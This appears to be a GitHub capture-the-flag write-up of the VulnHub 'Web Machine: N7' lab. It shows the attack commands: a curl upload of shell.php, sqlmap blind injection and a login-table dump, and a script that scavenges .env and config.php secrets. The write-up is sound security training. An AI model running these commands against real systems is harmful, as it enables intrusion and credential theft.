<div align="center">

# 🫧 Lab N7: Web Exploitation & Database Siphon

<img src="https://github.com/user-attachments/assets/2d535b4e-5727-4d28-a6ca-c0e0da4b7a00" width="860" alt="Lab N7 Banner"/>

<br/>

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue?style=for-the-badge&logo=linux&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![Vector](https://img.shields.io/badge/Vector-Web%20Exploitation-red?style=for-the-badge&logo=html5&logoColor=white)
![SQLi](https://img.shields.io/badge/SQLi-Blind%20Time--Based-critical?style=for-the-badge&logo=mysql&logoColor=white)
![Tools](https://img.shields.io/badge/Tools-SQLmap%20%7C%20DirBuster%20%7C%20curl-orange?style=for-the-badge)
![Flag](https://img.shields.io/badge/Flag-Captured%20%F0%9F%8F%86-success?style=for-the-badge)

</div>

---

## 📌 About This Lab

This repository documents the full penetration test and data exfiltration of **[Web Machine: (N7)](https://www.vulnhub.com/entry/web-machine-n7,756/)**: a purposely vulnerable VM created by **Duty Mastr**, released **November 3, 2021**.

The engagement utilized a custom exploitation framework, [**bubble_siphon**](https://github.com/MoriartyPuth/bubble-siphon), to profile the host, uncover hidden entry points, and siphon sensitive credentials and flags from the underlying database.

| Field | Details |
|---|---|
| 🖥️ Machine Name | Web Machine: (N7) |
| ⚡ Difficulty | Medium |
| 📦 Format | VirtualBox OVA |
| 🐧 OS | Linux |
| 🌐 Network | DHCP / Bridged |
| 🎯 Primary Vector | Web-based vulnerabilities |
| 🏆 Flag | `FLAG{N7:KSA_01}` |

---

## 🗺️ Attack Chain

```
[Host Discovery] → [Port Scan] → [Directory Fuzzing] → [Hidden Portal]
      → [Upload Bypass + curl] → [Partial Flag] → [Blind SQLi]
            → [DB Dump] → [Credential Recovery] → [FLAG 🏆]
```

---

## 🛠️ Methodology

### 1️⃣ Network Enumeration & Target Validation

The lab was configured with **bridged networking** for direct host-to-host communication between the Kali attacker machine and the target VM.

```bash
# Host discovery
sudo arp-scan -l
```

![Host Discovery](https://github.com/user-attachments/assets/27c18f5c-a492-451e-9bcb-7c26a4dce983)

```bash
# Full service scan
nmap -sCV -T4 <TARGET_IP>
```

> 📡 Result: **Port 80 (HTTP)** was the sole open port: the entire attack surface.

---

### 2️⃣ Directory & Parameter Fuzzing

Initial scans with standard wordlists returned minimal results. Escalating to an aggressive, custom dictionary with **DirBuster** eventually cracked it open.

![Fuzzing](https://github.com/user-attachments/assets/1643e951-c524-4c56-a39a-8689069d2f48)

**Key endpoints discovered:**

| Endpoint | Purpose |
|---|---|
| `/exploit.html` | Hidden upload form |
| `/enter_network` | Administrative login gateway |

![Endpoint Discovery](https://github.com/user-attachments/assets/c24c6fb3-242d-4cb8-bd6a-7b753dea385c)

---

### 3️⃣ Exploitation & Lateral Movement

#### 🔓 Upload Form Bypass

The `/exploit.html` upload form was misconfigured: its action pointed to `localhost`, making browser-based submission useless. This was trivially bypassed by crafting a direct `POST` request to the backend handler.

```bash
curl -X POST http://<TARGET_IP>/profile.php \
  -F "file=@shell.php" \
  -v
```

![curl exploit](https://github.com/user-attachments/assets/fc7121a4-3c2f-4ef4-af13-29e649fbc2ac)

> 💬 Interacting with `profile.php` directly triggered a **partial flag disclosure**: `FLAG{N7`

---

#### 💉 Blind SQL Injection via `/enter_network`

The login form at `/enter_network` was found vulnerable to SQL injection on the `user` parameter. Time-based blind injection was confirmed using `sqlmap` at elevated risk and level settings.

```bash
sqlmap -u "http://<TARGET_IP>/enter_network/index.php" \
  --data="user=admin&pass=admin" \
  --level 3 \
  --risk 3 \
  --dbms=mysql \
  --batch
```

![SQLmap](https://github.com/user-attachments/assets/95a2d0a5-df9e-4a55-9f9b-facddd54961e)

---

### 4️⃣ Post-Exploitation & Data Siphoning

#### 🗄️ Database Exfiltration

With injection confirmed, `sqlmap` was pointed at the **Machine** database to dump the `login` table.

```bash
sqlmap -u "http://<TARGET_IP>/enter_network/index.php" \
  --data="user=admin&pass=admin" \
  -D Machine \
  -T login \
  --dump \
  --batch
```

![DB Dump](https://github.com/user-attachments/assets/c79f9a07-1bfd-4cc3-b950-35f652f23ba7)

> 🎯 The **final flag** and **admin credentials** were recovered from the `password` field of the `login` table.

---

#### 🫧 bubble_siphon Deployment

The custom **`bubble_siphon.sh`** framework was deployed post-compromise to scavenge the web root for configuration secrets.

```bash
# Profile the web server identity
whoami        # → www-data

# Scavenge /var/www/ for config secrets
./bubble_siphon.sh --target /var/www/ --hunt .env,config.php
```

Artifacts targeted for extraction: `.env` files, `config.php`, SSH keys, and any hardcoded credentials within the web directory.

---

## 🧰 Tools & Framework

| Tool | Role |
|---|---|
| 🫧 [`bubble_siphon.sh`](https://github.com/MoriartyPuth/bubble-siphon) | Custom post-exploitation & secret scavenging framework |
| 💉 `sqlmap` | Automated blind SQL injection & database dumping |
| 📁 `DirBuster` / `FFUF` | Directory brute-force & endpoint discovery |
| 🌐 `curl` | Manual HTTP request crafting & upload bypass |
| 🔍 `nmap` | Port scanning & service profiling |
| 📡 `arp-scan` | Local subnet host discovery |

---

## 🏆 Final Flag

<div align="center">

```
█▀▀ █░░ ▄▀█ █▀▀
█▀░ █▄▄ █▀█ █▄█

FLAG{N7:KSA_01}
```

</div>

---

## ⚠️ Disclaimer

> This writeup is strictly for **educational and research purposes**. All testing was conducted in an isolated, offline lab environment against an intentionally vulnerable machine. Never use these techniques against systems you do not own or have explicit written authorization to test.

---
